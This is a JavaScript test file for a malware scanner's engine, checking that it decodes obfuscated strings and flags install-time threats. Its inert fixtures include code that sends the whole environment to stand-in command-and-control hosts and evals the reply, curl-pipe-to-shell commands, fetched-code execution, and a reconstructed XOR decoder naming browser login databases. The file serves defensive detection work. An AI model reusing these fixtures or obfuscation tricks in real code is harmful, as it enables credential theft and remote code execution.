// 0.1.8 in the npm engine (the native engine's, lib/native.js):
// names in strings a file decodes as it runs (decodedView), eval of a file's
// own decoder (SC-EVAL-DECODER), Function.constructor, statements over
// several rows and environment variables in the received-code detector, and
// a script downloaded or decoded, written and run with a shell or an
// interpreter. python/tests/scanner/test_decoded_and_staged.py has the full
// cases and tests/architecture/test_snapshot_hooks.py holds the engine to
// its recorded outputs. Inert text: hosts are .invalid, nothing is executed.

import { test } from "node:test";
import assert from "node:assert/strict";
import { importTimeRisk, importTimeSeverity, installScriptRisk, runsReceivedCode } from "../src/index.js";
import { decodedView, spawnedScripts, packValues } from "../src/lib/native.js";
import { pyRe } from "../src/lib/pycompat.js";

const NOTE = " (in strings it decodes as it runs)";
const hex = (s) => Buffer.from(s).toString("hex");

const TAILWIND = "\"use strict\";\n\nfunction g(h) { return h.replace(/../g, match => String.fromCharCode(parseInt(match, 16))); }\n\n"
  + `let hl = [\n    g('${hex("require")}'),\n    g('${hex("axios")}'),\n    g('${hex("post")}'),\n`
  + `    g('${hex("https://c2.invalid/a")}'),\n    g('${hex("then")}'),\n];\n\n`
  + "const writer = () => require(hl[1])[[hl[2]]](hl[3], { ...process.env })[[hl[4]]](r => eval(r.data));\n\n"
  + "module.exports = writer;\n";

test("a helper's hex names and a constant array are read decoded", () => {
  const view = decodedView(TAILWIND);
  assert.ok(view.includes("require('axios')[['post']]('https://c2.invalid/a', { ...process.env })[['then']]"));
  assert.equal(view.split("\n").length, TAILWIND.split("\n").length);
  // (read on the tree, the decoded view's `[['post']]` is a send too: of the whole environment)
  const [reasons, line] = importTimeRisk(TAILWIND, "js");
  assert.deepEqual([reasons, line], [["reads credentials or the whole environment and sends data over the network" + NOTE,
    "runs code it receives over the network" + NOTE], 13]);
  assert.equal(importTimeSeverity(reasons), "CRITICAL");
});

test("names hidden from the install-script test", () => {
  const metrics = `(() => {\n  const a = require(\n    Buffer.from("${hex("https")}", "hex").toString()\n  );\n`
    + "  const env = Object.fromEntries(Object.keys(process[\"env\"]).map(k => [k, process[\"env\"][k]]));\n"
    + "  const req = a.request({ hostname: 'collector.invalid', method: 'POST' });\n  req.write(JSON.stringify(env));\n})();\n";
  assert.deepEqual(installScriptRisk(metrics),
    ["sends environment variables over the network (the whole environment)" + NOTE]);
});

test("phase 2: literals read as the runtime reads them, in JavaScript and Python", () => {
  const partly = "require('child_pro\\x63ess').execSync('cu\\x72l https://x.invalid/i.sh | sh');\n";
  assert.equal(decodedView(partly, "js"), "require('child_process').execSync('curl https://x.invalid/i.sh | sh');\n");
  assert.equal(decodedView(partly), partly);            // a text of no known language: wholly escaped literals only
  assert.deepEqual(installScriptRisk(partly, true, false, "js"), ["pipes a download into a shell" + NOTE]);
  const b64 = Buffer.from("child_process").toString("base64");
  const joined = `const cp = require(atob('${b64.slice(0, 8)}' +\n  /* part */ "${b64.slice(8)}"));\nmodule.exports = cp;\n`;
  assert.equal(decodedView(joined, "js"), "const cp = require('child_process');\n\nmodule.exports = cp;\n");
  const py = Buffer.from("subprocess").toString("base64");
  const adjacent = `import base64\nm = __import__(base64.b64decode('${py.slice(0, 6)}'\n    '${py.slice(6)}').decode())\n`;
  assert.equal(decodedView(adjacent, "py"), "import base64\nm = __import__('subprocess')\n\n");
});

test("SC-EVAL-DECODER: eval of a decoder over a blob of character codes", () => {
  const rule = packValues("RULES")[0].find((r) => r.id === "SC-EVAL-DECODER").re;   // core's pattern, from the engine's pack
  const rx = pyRe(rule.re, rule.flags);
  const codes = Array.from({ length: 260 }, (_, k) => 40 + (k % 80)).join(",");
  assert.ok(rx.test("try{eval(function(s,n){return s.replace(/[a-zA-Z]/g,function(c){var b=c<=\"Z\"?65:97;"
    + "return String.fromCharCode((c.charCodeAt(0)-b+n)%26+b)})}([" + codes + "],17))}catch(e){}"));
  assert.ok(!rx.test("eval(function(s,n){return s}([1,2,3],1))"));
  const blob = "'" + "QUJD".repeat(300) + "'";
  for (const text of ["eval(decode(" + blob + "))", "new Function(unpack(" + blob + "))()", "vm.runInThisContext(d(" + blob + "))",
    "eval(function(p,a,c,k,e,d){return p}(" + blob + ",62,10,'a|b'.split('|'),0,{}))"]) assert.ok(rx.test(text), text);
});

test("Function.constructor, rows joined, environment variables", () => {
  const ctor = "const axios = require('axios');\n(async () => {\n  const s = (await axios.get(u)).data;\n"
    + "  const h = new Function.constructor('require', s);\n  h(require);\n})();\n";
  const chain = "const axios = require('axios');\n(async () => {\n  axios\n    .post('https://c2.invalid/a', { v })\n"
    + "    .then((r) => {\n      eval(r.data.model);\n    });\n})();\n";
  const env = "import os, requests\nos.environ['P'] = requests.get(u).text\nexec(os.getenv('P'))\n";
  assert.equal(runsReceivedCode(ctor), 4);
  assert.equal(runsReceivedCode(chain), 6);
  assert.equal(runsReceivedCode(env), 3);
});

test("a script downloaded, or decoded, written and run with an interpreter", () => {
  const bash = "import os, subprocess, requests\nr = requests.get(u)\nwith open(p, 'wb') as f:\n    f.write(r.content)\n"
    + "subprocess.run(['/bin/bash', p])\n";
  assert.deepEqual(installScriptRisk(bash), ["downloads a script and runs it with bash"]);
  const decoded = "import subprocess, base64, sys, os\nb = 'cHJpbnQoMSkK'\nwith open(p, 'wb') as f:\n"
    + "    f.write(base64.b64decode(b))\nsubprocess.run([sys.executable, p])\n";
  const [reasons] = importTimeRisk(decoded, "py");
  assert.deepEqual(reasons, ["writes code it decodes to a file and runs it with Python"]);
  assert.equal(importTimeSeverity(reasons), "CRITICAL");
});

test("members read by name, and a runner handed to a call (the follower's adversarial pass)", () => {
  const RUN = "runs code it receives over the network";
  for (const text of [
    "import requests\nexec(getattr(requests, 'get')('https://c2.invalid/p').text)\n",
    "import requests\nr = requests.get('https://c2.invalid/p')\nexec(r.__dict__['_content'])\n",
    "fetch('https://c2.invalid/p').then((r) => r.text()).then(eval);\n",
    "const https = require('https');\nhttps.get('https://c2.invalid/p', (res) => res.on('data', eval));\n",
  ]) {
    assert.deepEqual(importTimeRisk(text)[0], [RUN], text);
  }
  assert.equal(runsReceivedCode("fetch('https://c2.invalid/p').then((r) => r.text()).then(JSON.parse);\n"), null);
});

// react-zutils 1.0.1's home-made XOR decoder (0.1.8): its calls read as their text
const xored = (text, key, kind = "base64") => {
  const data = Buffer.from([...Buffer.from(text)].map((b, i) => b ^ key.charCodeAt(i % key.length)));
  return kind === "hex" ? data.toString("hex") : data.toString("base64").replace(/=+$/, "");
};
const ZUTILS_WORDS = ["sqlite3", "child_process", "crypto", "https://c2.ngrok-free.app/api", "Login Data",
  "SELECT * FROM logins", "Local State"];
const ZUTILS = "const c=\"base64\",s=\"utf8\",n=(t,e)=>{let r=Buffer.from(t,c);const o=r.length;let n=0,a=new Uint8Array(o);"
  + "for(index=0;index<o;index++){n=3&index;let t=e[l](n);a[index]=255&(r[index]^t)}return Buffer.from(a).toString(s)},"
  + "a=t=>n(t,s),l=\"charCodeAt\",\n" + ZUTILS_WORDS.map((w, i) => `v${i}=a("${xored(w, "utf8")}")`).join(",\n") + ";\n"
  + "const q=require(v1);\n";

test("a home-made XOR decoder's calls are read as their text", () => {
  const view = decodedView(ZUTILS);
  assert.ok(view.includes("v0='sqlite3'") && view.includes("v3='https://c2.ngrok-free.app/api'"));
  assert.equal(view.split("\n").length, ZUTILS.split("\n").length);
  // (0.1.8: the service the decoded address names is where data would go, not a sign on its own: this
  // shape reads and sends nothing)
  assert.deepEqual(installScriptRisk(ZUTILS), []);
  const hexText = "const k = 'k3y!'; Buffer; x ^ y;\n" + ZUTILS_WORDS.map((w) => `dec('${xored(w, "k3y!", "hex")}');`).join("\n") + "\n";
  assert.ok(decodedView(hexText).includes("\n'sqlite3';\n'child_process';\n"));
  const calls = (words) => words.map((w) => `a("${xored(w, "utf8")}")`).join(",");
  for (const text of ["Buffer 'utf8' " + calls(ZUTILS_WORDS.slice(0, 5)), "Buffer x^y " + calls(ZUTILS_WORDS.slice(0, 5)),
    "Buffer x^y 'utf8' " + calls(ZUTILS_WORDS.slice(0, 4)), "Buffer x^y 'utf8' " + calls(["os", "fs", "vm", "tty", "url"]),
    "Buffer x^y 'utf8' t('menu'); t('help'); t('save'); t('open'); t('edit'); t('quit');"]) {
    assert.equal(decodedView(text), text, text.slice(0, 40));
  }
  const nine = "Buffer x^y 'utf8' " + calls([...ZUTILS_WORDS, "abc", "def"]);
  assert.notEqual(decodedView(nine + ',a("x-y")'), nine + ',a("x-y")');
  assert.equal(decodedView(nine + ',a("x-y"),a("x-y")'), nine + ',a("x-y"),a("x-y")');
  const many = Array.from({ length: 255 }, (_, i) => `'k${i}';`).join("");
  assert.notEqual(decodedView("Buffer x^y " + many + "'utf8'; " + calls(ZUTILS_WORDS)), "Buffer x^y " + many + "'utf8'; " + calls(ZUTILS_WORDS));
  const late = "Buffer x^y " + many + "'k-last'; 'utf8'; " + calls(ZUTILS_WORDS);
  assert.equal(decodedView(late), late);
  for (const text of ["Buffer x^y " + Array.from({ length: 5000 }, (_, i) => `'k${i}';`).join("") + calls(ZUTILS_WORDS).repeat(50),
    "Buffer x^y " + Array.from({ length: 100_000 }, (_, i) => `f${i % 300}("QUJDRA")`).join(","),
    "Buffer x^y 'utf8' " + ('a("' + "A".repeat(400) + '"),').repeat(20_000)]) {
    const start = performance.now();
    decodedView(text);
    assert.ok(performance.now() - start < 5000, text.slice(0, 30));
  }
});

// 0.1.8: character codes read as text — literal ones, and what a file's own decoder computes from them, whatever its
// key (core's comment above _DV_CC_BODY; test_decoded_and_staged.CharCodeTests has the full cases)
const codes = (text, f) => "[" + [...text].map((ch, i) => String(f(ch.charCodeAt(0), i))).join(", ") + "]";
const keyed = (i, bias) => ((i + bias) * 29 + 11) & 0xff;

test("literal character codes are read as their text", () => {
  for (const [src, want] of [["String.fromCharCode(104, 116, 116, 112, 115)", "'https'"],
    ["String.fromCharCode(...[0x63, 0x75, 0x72, 0x6c])", "'curl'"], ["String.fromCharCode.apply(null, [101, 118, 97, 108])", "'eval'"],
    ["''.join(map(chr, [111, 115]))", "'os'"], ["''.join(chr(c) for c in [115, 104])", "'sh'"],
    ["bytearray([119, 103, 101, 116]).decode('utf-8')", "'wget'"]]) {
    assert.equal(decodedView("x = " + src + ";\n"), "x = " + want + ";\n", src);
  }
  for (const src of ["String.fromCharCode(10)", "String.fromCharCode(65 + i)", "bytes([0, 1]).decode()", "String.fromCharCode(0x110000)"]) {
    assert.equal(decodedView("x = " + src + ";\n"), "x = " + src + ";\n", src);
  }
});

test("a decoder of the file's own with a key that moves, and the script it starts", () => {
  const text = "function unpack(buffer, bias) {\n  var out = '';\n  for (var pos = 0; pos < buffer.length; pos++) {\n"
    + "    out += String.fromCharCode(buffer[pos] ^ ((pos + bias) * 29 + 11 & 0xff));\n  }\n  return out;\n}\n"
    + "var _dir = " + codes("worker", (c, i) => c ^ keyed(i, 4)) + ";\n"
    + "var p = path.join(__dirname, unpack(_dir, 4), unpack(" + codes("run.js", (c, i) => c ^ keyed(i, 9))
    + ", 9));\nspawn(process.execPath, [p], { detached: true, stdio: 'ignore' }).unref();\n";
  assert.ok(decodedView(text).includes("var p = path.join(__dirname, 'worker', 'run.js');"));
  assert.deepEqual(spawnedScripts(text), [["dir", "worker/run.js"]]);
  const dec = "function d(a, k) { var o = ''; for (var i = 0; i < a.length; i++) o += String.fromCharCode(a[i] ^ (i * 3 + k & 0xff)); return o; }\n";
  const cmd = codes("curl -fsSL https://c2.invalid/x.sh | sh", (c, i) => c ^ ((i * 3 + 77) & 0xff));
  assert.deepEqual(installScriptRisk(dec + "require('child_process').execSync(d(" + cmd + ", 77));\n"),
    ["pipes a download into a shell" + NOTE]);
});

test("the forms of a decoder, and what is not read", () => {
  for (const [decoder, call] of [
    ["const d = (a, k) => a.map((c, i) => String.fromCharCode(c - k - i)).join('');\n", (w) => "d(" + codes(w, (c, i) => c + 5 + i) + ", 5)"],
    ["function d(a) { return String.fromCharCode(...a.map(c => c ^ 0x5a)); }\n", (w) => "d(" + codes(w, (c) => c ^ 0x5a) + ")"],
    ["const d = (s) => s.split('').map(ch => String.fromCharCode(ch.charCodeAt(0) - 1)).join('');\n",
      (w) => "d('" + [...w].map((ch) => String.fromCharCode(ch.charCodeAt(0) + 1)).join("") + "')"],
    ["def d(data, k):\n    return ''.join([chr((c + 256 - i - k) % 256) for i, c in enumerate(data)])\n",
      (w) => "d(" + codes(w, (c, i) => (c + i + 7) % 256) + ", 7)"],
    ["def d(s):\n    return ''.join(chr(ord(ch) - 2) for ch in s)\n",
      (w) => "d('" + [...w].map((ch) => String.fromCharCode(ch.charCodeAt(0) + 2)).join("") + "')"]]) {
    const text = decoder + "x = " + call("https://c2.invalid/k") + "\n";
    assert.equal(decodedView(text), decoder + "x = 'https://c2.invalid/k'\n", decoder.slice(0, 50));
  }
  const dec = "function d(a, k) { let s = ''; for (let i = 0; i < a.length; i++) s += String.fromCharCode({}); return s; }\n";
  const arr = codes("os", (c) => c);
  for (const [expr, call] of [["a[i] ^ k", "d(q, 0)"], ["a[i] ^ SECRET", "d(" + arr + ", 0)"],
    ["(a[i] - 200) % 256", "d(" + arr + ", 0)"], ["a[i] << 40", "d(" + arr + ", 0)"],
    ["a[i] * 100000 * 100000", "d(" + arr + ", 0)"], ["a[i] / 2", "d(" + arr + ", 0)"]]) {
    const text = dec.replace("{}", expr) + "x = " + call + ";\n";
    assert.equal(decodedView(text), text, expr);
  }
  const once = "function d(a) { let s = ''; for (let i = 0; i < a.length; i++) s += String.fromCharCode(a[i] - 1); return s; }\n";
  const p = codes("child_process", (c) => c + 1);
  assert.ok(decodedView(once + "const P = " + p + ";\nrequire(d(P));\n").includes("require('child_process')"));
  assert.ok(!decodedView(once + "let P = " + p + ";\nP.push(1);\nrequire(d(P));\n").includes("child_process"));
});

test("character codes: bounded", () => {
  const dec = "function d(a) { let s = ''; for (let i = 0; i < a.length; i++) s += String.fromCharCode(a[i] ^ 1); return s; }\n";
  const one = "d(" + codes("abcdefghij".repeat(40), (c) => c ^ 1) + ");\n";
  assert.equal(decodedView(dec + one.repeat(200)).split("'abcdefghij").length - 1, 125);
  const start = performance.now();
  decodedView(dec + "d([1,2,3]);".repeat(100_000));
  decodedView("String.fromCharCode(".repeat(50_000) + "\n" + "function f(a){String.fromCharCode(a[i]);}".repeat(20_000));
  assert.ok(performance.now() - start < 5000);
});
